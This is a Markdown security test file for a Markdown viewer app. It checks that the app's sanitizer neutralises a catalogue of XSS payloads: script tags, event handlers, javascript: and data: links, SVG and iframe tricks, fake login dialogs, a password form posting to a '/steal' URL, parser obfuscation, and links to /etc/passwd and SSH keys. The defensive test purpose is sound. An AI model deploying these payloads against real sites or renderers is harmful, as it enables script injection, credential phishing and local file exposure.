# Security Test Document

> [!WARNING]
> This document contains deliberate attack payloads. Markdown Viewer must render
> **all of them inert**. When this file is open:
>
> - no alert, prompt or dialog appears (other than the app's own optional
>   external-link confirmation);
> - no program, window or web page opens unless you click a normal `https:`
>   link;
> - nothing looks like part of the application's interface;
> - the rest of the app keeps working normally.
>
> If any payload below executes, please report it privately as described in
> `SECURITY.md`.

Each section shows the payload as code first, followed by the raw payload
itself, which the sanitizer must neutralize.

## 1. Script tags

```html
<script>alert('script tag')</script>
<SCRIPT SRC="https://example.com/xss.js"></SCRIPT>
<script type="module">import('https://example.com/x.js')</script>
```

<script>alert('script tag')</script>
<SCRIPT SRC="https://example.com/xss.js"></SCRIPT>
<script type="module">import('https://example.com/x.js')</script>

Text after the scripts should still render.

## 2. Event handlers

```html
<img src="does-not-exist.png" onerror="alert('img onerror')">
<p onclick="alert('onclick')">Click this paragraph.</p>
<details open ontoggle="alert('ontoggle')"><summary>Toggle me</summary>Body</details>
<a href="#" onmouseover="alert('mouseover')">Hover this link</a>
<body onload="alert('body onload')">
```

<img src="does-not-exist.png" onerror="alert('img onerror')">

<p onclick="alert('onclick')">Click this paragraph.</p>

<details open ontoggle="alert('ontoggle')"><summary>Toggle me</summary>Body</details>

<a href="#" onmouseover="alert('mouseover')">Hover this link</a>

<body onload="alert('body onload')">

## 3. Dangerous URL schemes

```markdown
[javascript link](javascript:alert('javascript link'))
[encoded javascript](jav&#x09;ascript:alert('encoded'))
[uppercase](JAVASCRIPT:alert('upper'))
[vbscript](vbscript:msgbox("vbs"))
[data html](data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==)
[file url](file:///etc/passwd)
[custom scheme](ms-settings:privacy)
![data svg](data:image/svg+xml;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+PC9zdmc+)
```

- [javascript link](javascript:alert('javascript link'))
- [encoded javascript](jav&#x09;ascript:alert('encoded'))
- [uppercase](JAVASCRIPT:alert('upper'))
- [vbscript](vbscript:msgbox("vbs"))
- [data html](data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==)
- [file url](file:///etc/passwd)
- [custom scheme](ms-settings:privacy)
- ![data svg](data:image/svg+xml;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+PC9zdmc+)
- <a href="javascript:alert('html anchor')">HTML anchor with javascript:</a>
- <a href="  javascript:alert('leading spaces')">Leading whitespace</a>

These links must do nothing when clicked.

## 4. Frames, objects and embeds

```html
<iframe src="https://example.com"></iframe>
<iframe srcdoc="<script>alert('srcdoc')</script>"></iframe>
<object data="https://example.com/x.swf"></object>
<embed src="https://example.com/x.swf">
<frameset><frame src="https://example.com"></frameset>
```

<iframe src="https://example.com"></iframe>
<iframe srcdoc="<script>alert('srcdoc')</script>"></iframe>
<object data="https://example.com/x.swf"></object>
<embed src="https://example.com/x.swf">

## 5. SVG and MathML

```html
<svg onload="alert('svg onload')"><circle r="40"/></svg>
<svg><script>alert('svg script')</script></svg>
<svg><a xlink:href="javascript:alert('svg link')"><text y="20">click</text></a></svg>
<math><mtext><img src=x onerror="alert('math')"></mtext></math>
```

<svg onload="alert('svg onload')"><circle r="40"/></svg>

<svg><script>alert('svg script')</script></svg>

<svg><a xlink:href="javascript:alert('svg link')"><text y="20">click</text></a></svg>

<math><mtext><img src=x onerror="alert('math')"></mtext></math>

## 6. Style injection

```html
<style>body { display: none !important; }</style>
<p style="position:fixed;inset:0;background:red;z-index:99999">Full-window overlay</p>
<link rel="stylesheet" href="https://example.com/evil.css">
<div style="background-image:url(javascript:alert('css'))">CSS URL</div>
```

<style>body { display: none !important; }</style>

<p style="position:fixed;inset:0;background:red;z-index:99999">Full-window overlay (must render as a normal paragraph)</p>

<link rel="stylesheet" href="https://example.com/evil.css">

<div style="background-image:url(javascript:alert('css'))">CSS URL (must render as plain text)</div>

## 7. Fake interface using app classes

A document must not be able to borrow the application's own classes to draw
convincing fake dialogs or overlays.

```html
<div class="fixed inset-0 z-50 bg-black modal-backdrop">
  <div class="dialog modal toast">Your session expired. Enter your password:</div>
</div>
```

<div class="fixed inset-0 z-50 bg-black modal-backdrop">
  <div class="dialog modal toast">Your session expired. Enter your password: (must render as plain text)</div>
</div>

<div class="markdown-alert-title sidebar tab-bar">Classes other than renderer classes are removed.</div>

## 8. Forms and inputs

```html
<form action="https://example.com/steal" method="post">
  <input type="password" name="password" placeholder="Password">
  <button type="submit">Log in</button>
</form>
<input type="text" value="text input" autofocus onfocus="alert('focus')">
<input type="checkbox" onclick="alert('checkbox')">
```

<form action="https://example.com/steal" method="post">
  <input type="password" name="password" placeholder="Password">
  <button type="submit">Log in</button>
</form>

<input type="text" value="text input" autofocus onfocus="alert('focus')">

<input type="checkbox" onclick="alert('checkbox')">

Only a disabled checkbox may remain.

## 9. Navigation and metadata tags

```html
<meta http-equiv="refresh" content="0; url=https://example.com">
<base href="https://example.com/">
<a href="https://example.com" target="_top">target _top</a>
<a href="https://example.com" target="_blank">target _blank</a>
```

<meta http-equiv="refresh" content="0; url=https://example.com">

<base href="https://example.com/">

- <a href="https://example.com" target="_top">target _top</a>
- <a href="https://example.com" target="_blank">target _blank</a>

The page must not navigate. Clicking these links opens the system browser (or
asks first, depending on settings), never inside the app.

## 10. Obfuscation and parser tricks

```html
<scr<script>ipt>alert('nested')</scr</script>ipt>
<img src=x onerror=alert`backticks`>
<IMG SRC=JaVaScRiPt:alert('case')>
<img src="x" alt="&quot; onerror=&quot;alert('attr break')">
<!-- <img src=x onerror="alert('comment')"> -->
<noscript><p title="</noscript><img src=x onerror=alert('noscript')>"></noscript>
<a href="&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;alert('entities')">entities</a>
<template><img src=x onerror="alert('template')"></template>
```

<scr<script>ipt>alert('nested')</scr</script>ipt>

<img src=x onerror=alert`backticks`>

<IMG SRC=JaVaScRiPt:alert('case')>

<img src="x" alt="&quot; onerror=&quot;alert('attr break')">

<!-- <img src=x onerror="alert('comment')"> -->

<noscript><p title="</noscript><img src=x onerror=alert('noscript')>"></noscript>

<a href="&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;alert('entities')">entities</a>

<template><img src=x onerror="alert('template')"></template>

## 11. Local file access

```markdown
![passwd](/etc/passwd)
![windows hosts](C:\Windows\System32\drivers\etc\hosts)
![ssh key](../../../../../../home/user/.ssh/id_rsa)
[run a program](/usr/bin/gnome-calculator)
[run an exe](C:\Windows\System32\calc.exe)
```

- ![passwd](/etc/passwd)
- ![windows hosts](C:\Windows\System32\drivers\etc\hosts)
- ![ssh key](../../../../../../home/user/.ssh/id_rsa)
- [run a program](/usr/bin/gnome-calculator)
- [run an exe](C:\Windows\System32\calc.exe)

Images that are not image files are refused by the local image protocol and
show a placeholder. Links to non-Markdown files may only reveal the file in its
folder; they must never execute it.

## 12. Insecure and tracking images

```markdown
![http image](http://example.com/pixel.png)
```

![http image](http://example.com/pixel.png)

Plain `http:` images are always blocked and replaced by a placeholder.

---

If you can read this line and nothing unexpected happened, the sanitizer, CSP
and link handling are working. Back to the [showcase](showcase.md).
